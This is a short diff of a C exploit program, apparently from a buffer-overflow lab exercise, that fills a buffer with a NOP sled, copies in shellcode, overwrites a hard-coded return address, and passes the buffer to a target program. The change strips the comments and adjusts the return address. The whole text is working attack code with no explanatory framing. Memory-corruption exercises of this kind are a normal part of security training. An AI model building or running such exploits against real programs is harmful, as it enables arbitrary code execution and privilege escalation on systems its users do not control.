@@ -9,18 +9,15 @@
 
 int main(void)
 {
-    char exploit[20]; // Adjusted to the required size
+    char exploit[20];
     char *args[3];
     char *env[1];
 
-    // Fill with NOP sled initially
     memset(exploit, 0x90, sizeof(exploit));
 
-    // Place the shellcode at the start of the buffer
     memcpy(exploit, shellcode, sizeof(shellcode) - 1);
 
-    // Overwrite the return address to point to the shellcode
-    uint32_t ret_address = 0xffffd4bc; // Start of the buffer
+    uint32_t ret_address = 0xffffd518; 
     memcpy(exploit + 16, &ret_address, 4);
 
     args[0] = TARGET;
